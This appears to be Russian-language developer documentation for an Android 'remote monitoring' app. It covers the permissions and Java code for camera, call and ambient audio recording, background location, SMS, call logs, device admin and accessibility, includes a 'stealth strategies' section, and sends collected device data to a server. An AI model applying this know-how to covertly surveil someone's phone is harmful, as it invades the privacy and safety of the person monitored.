# 🔐 Система разрешений Android

## 📋 Обзор

Android Remote Monitoring System использует сложную систему разрешений для обеспечения полного функционала мониторинга. Система адаптируется к различным версиям Android (5.0-14) и обрабатывает изменения в политике разрешений.

---

## 📱 Поддерживаемые версии Android

| Версия | API Level | Особенности разрешений |
|--------|-----------|------------------------|
| Android 5.0-5.1 | 21-22 | Разрешения при установке |
| Android 6.0+ | 23+ | Runtime разрешения |
| Android 8.0+ | 26+ | Ограничения фоновых служб |
| Android 10+ | 29+ | Scoped Storage |
| Android 11+ | 30+ | Разрешения только на время использования |
| Android 12+ | 31+ | Приблизительная геолокация |
| Android 13+ | 33+ | Гранулярные медиа-разрешения |
| Android 14 | 34+ | Частичное фото/видео разрешение |

---

## 🔑 Основные разрешения

### 📷 Камера
```xml
<uses-permission android:name="android.permission.CAMERA" />
```
**Требуется для:**
- Съемка фото и видео
- Доступ к фронтальной/основной камере
- Стриминг видео в real-time

**Особенности:**
- Android 6.0+: Runtime разрешение
- Пользователь может отозвать в любое время
- Требуется hardware feature declaration

### 🎤 Аудио
```xml
<uses-permission android:name="android.permission.RECORD_AUDIO" />
```
**Требуется для:**
- Запись звонков
- Окружающий звук
- Голосовые заметки
- Двусторонняя аудиосвязь

### 📍 Геолокация
```xml
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
```

**Android 12+ изменения:**
- Пользователь может выбрать "Приблизительное" или "Точное" местоположение
- Фоновая геолокация требует отдельного разрешения

### 📁 Хранилище
**Android 10 и ниже:**
```xml
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
```

**Android 11+:**
```xml
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
```

**Android 13+ (гранулярные разрешения):**
```xml
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
<uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
<uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
```

### 💬 SMS и звонки
```xml
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
```

### 📞 Управление звонками
```xml
<uses-permission android:name="android.permission.CALL_PHONE" />
<uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
```

---

## 🛡️ Системные разрешения

### 🔋 Управление питанием
```xml
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
```

### 📢 Уведомления
**Android 13+:**
```xml
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
```

### 🔧 Администрирование устройства
```xml
<uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
<uses-permission android:name="android.permission.WRITE_SETTINGS" />
<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
```

---

## 📝 Реализация PermissionManager

### Универсальная система разрешений
```java
public class PermissionManager {
    
    // Группы разрешений по функциональности
    private static final String[] CAMERA_PERMISSIONS = {
        Manifest.permission.CAMERA
    };
    
    private static final String[] LOCATION_PERMISSIONS = {
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION
    };
    
    private static final String[] STORAGE_PERMISSIONS = getStoragePermissions();
    
    // Адаптация к версии Android
    private static String[] getStoragePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return new String[]{
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            };
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return new String[]{
                Manifest.permission.MANAGE_EXTERNAL_STORAGE
            };
        } else {
            return new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            };
        }
    }
}
```

### Запрос разрешений по группам
```java
public void requestPermissionGroup(PermissionGroup group, PermissionCallback callback) {
    String[] permissions = getPermissionsForGroup(group);
    
    // Проверяем какие разрешения нужно запросить
    List<String> permissionsToRequest = new ArrayList<>();
    
    for (String permission : permissions) {
        if (ContextCompat.checkSelfPermission(context, permission) 
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(permission);
        }
    }
    
    if (permissionsToRequest.isEmpty()) {
        callback.onPermissionGranted(group);
        return;
    }
    
    // Запрашиваем разрешения
    ActivityCompat.requestPermissions(
        activity,
        permissionsToRequest.toArray(new String[0]),
        group.getRequestCode()
    );
}
```

---

## ⚠️ Специальные разрешения

### 1. Доступность (Accessibility)
```java
// Требует пользовательского действия в настройках
private void requestAccessibilityPermission() {
    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
    startActivity(intent);
}
```

### 2. Device Admin
```java
// Требует активации администратора устройства
private void requestDeviceAdminPermission() {
    ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
    startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
}
```

### 3. Наложения (System Alert Window)
```java
// Android 6.0+ требует разрешение через настройки
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
    if (!Settings.canDrawOverlays(this)) {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
        intent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(intent);
    }
}
```

### 4. Оптимизация батареи
```java
@TargetApi(Build.VERSION_CODES.M)
private void requestBatteryOptimizationException() {
    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
    String packageName = getPackageName();
    
    if (!pm.isIgnoringBatteryOptimizations(packageName)) {
        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        intent.setData(Uri.parse("package:" + packageName));
        startActivity(intent);
    }
}
```

---

## 🔄 Стратегия запроса разрешений

### 1. Поэтапный запрос
```java
public void requestAllPermissions() {
    // Этап 1: Основные разрешения
    requestBasicPermissions();
}

private void requestBasicPermissions() {
    requestPermissionGroup(PermissionGroup.CAMERA, new PermissionCallback() {
        @Override
        public void onPermissionGranted(PermissionGroup group) {
            // Переходим к следующей группе
            requestLocationPermissions();
        }
        
        @Override
        public void onPermissionDenied(PermissionGroup group) {
            // Показываем объяснение и повторяем запрос
            showPermissionExplanation(group);
        }
    });
}
```

### 2. Объяснение необходимости
```java
private void showPermissionExplanation(PermissionGroup group) {
    AlertDialog.Builder builder = new AlertDialog.Builder(this);
    builder.setTitle("Разрешение требуется");
    builder.setMessage(getPermissionExplanation(group));
    builder.setPositiveButton("Предоставить", (dialog, which) -> {
        requestPermissionGroup(group, callback);
    });
    builder.setNegativeButton("Отмена", (dialog, which) -> {
        // Ограниченная функциональность
        enableLimitedMode();
    });
    builder.show();
}
```

---

## 📊 Мониторинг состояния разрешений

### Runtime проверка
```java
public class PermissionMonitor {
    
    public void monitorPermissions() {
        // Периодическая проверка состояния разрешений
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkAllPermissions();
            }
        }, 0, 30000); // Каждые 30 секунд
    }
    
    private void checkAllPermissions() {
        for (PermissionGroup group : PermissionGroup.values()) {
            boolean granted = hasPermissionGroup(group);
            
            if (!granted && wasGrantedBefore(group)) {
                // Разрешение было отозвано
                onPermissionRevoked(group);
            }
        }
    }
    
    private void onPermissionRevoked(PermissionGroup group) {
        // Уведомляем пользователя и предлагаем восстановить
        showPermissionRevokedNotification(group);
        
        // Отключаем функциональность
        disableFunctionality(group);
    }
}
```

---

## 🎯 Стелс стратегии

### 1. Минимальные запросы при установке
```java
// Запрашиваем только критически необходимые разрешения при установке
// Остальные - по мере необходимости во время работы
private static final String[] INITIAL_PERMISSIONS = {
    Manifest.permission.INTERNET,
    Manifest.permission.ACCESS_NETWORK_STATE,
    Manifest.permission.WAKE_LOCK
};
```

### 2. Контекстуальные запросы
```java
// Запрашиваем разрешения в контексте их использования
private void takePhoto() {
    if (!hasPermission(Manifest.permission.CAMERA)) {
        showCameraRationale(); // Объясняем зачем нужна камера
        requestPermission(Manifest.permission.CAMERA);
    } else {
        performPhotoCapture();
    }
}
```

### 3. Graceful degradation
```java
// Работаем с ограниченной функциональностью при отсутствии разрешений
public void gatherSystemInfo() {
    SystemInfo info = new SystemInfo();
    
    if (hasPermission(Manifest.permission.READ_PHONE_STATE)) {
        info.setDeviceInfo(getDetailedDeviceInfo());
    } else {
        info.setDeviceInfo(getBasicDeviceInfo()); // Без разрешений
    }
    
    if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
        info.setLocation(getCurrentLocation());
    }
    
    sendToServer(info);
}
```

---

## 🔧 Отладка разрешений

### ADB команды для тестирования
```bash
# Предоставление разрешений через ADB
adb shell pm grant com.example.remotemonitor android.permission.CAMERA
adb shell pm grant com.example.remotemonitor android.permission.ACCESS_FINE_LOCATION

# Отзыв разрешений
adb shell pm revoke com.example.remotemonitor android.permission.CAMERA

# Проверка состояния разрешений
adb shell dumpsys package com.example.remotemonitor | grep permission

# Сброс разрешений приложения
adb shell pm reset-permissions com.example.remotemonitor
```

### Логирование состояния разрешений
```java
public void logPermissionState() {
    for (PermissionGroup group : PermissionGroup.values()) {
        boolean granted = hasPermissionGroup(group);
        Log.d(TAG, String.format("Permission Group %s: %s", 
                  group.name(), granted ? "GRANTED" : "DENIED"));
        
        // Детальная информация по каждому разрешению в группе
        for (String permission : group.getPermissions()) {
            boolean permGranted = hasPermission(permission);
            Log.v(TAG, String.format("  %s: %s", 
                      permission, permGranted ? "✓" : "✗"));
        }
    }
}
```

---

## ⚖️ Этические соображения

### 1. Прозрачность
- Четко объясняйте зачем нужно каждое разрешение
- Предоставляйте возможность работы без разрешений
- Не скрывайте истинное назначение функций

### 2. Минимализм
- Запрашивайте только необходимые разрешения
- Запрашивайте разрешения по мере необходимости
- Предоставляйте альтернативы при отказе

### 3. Уважение к выбору пользователя
- Не навязывайте разрешения повторными запросами
- Работайте с ограниченной функциональностью при отказе
- Не используйте dark patterns для принуждения

---

## 📚 Полезные ресурсы

- [Android Permissions Guide](https://developer.android.com/guide/topics/permissions)
- [Permission Best Practices](https://developer.android.com/training/permissions/requesting)
- [Scoped Storage Guide](https://developer.android.com/training/data-storage/shared)
- [Runtime Permissions](https://developer.android.com/training/permissions/requesting)

---

**👨‍💻 Автор**: ReliableSecurity  
**📞 Telegram**: @ReliableSecurity  
**⚖️ Образовательный проект - используйте этично!**